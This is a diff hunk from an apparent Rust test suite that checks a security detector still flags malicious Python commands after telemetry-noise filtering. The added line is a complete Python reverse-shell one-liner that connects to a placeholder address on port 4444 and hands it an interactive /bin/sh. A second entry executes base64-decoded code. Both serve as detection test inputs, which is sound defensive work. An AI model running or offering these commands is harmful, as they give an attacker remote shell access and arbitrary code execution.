@@ -354,7 +354,7 @@ async fn telemetry_noise_real_detector_keeps_malicious_python() {
     let _guard = crate::test_support::TestEnvGuard::new(&[]);
     let mut runtime = runtime();
     for command in [
-        "python3 -c 'import socket,subprocess; s=socket.socket(); s.connect((\"198.51.100.10\",4444)); subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"198.51.100.10\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
         "python3 -c 'import base64;exec(base64.b64decode(payload))'",
     ] {
         let mut e = evaluation("python3", "sh", command, None, 10_000);
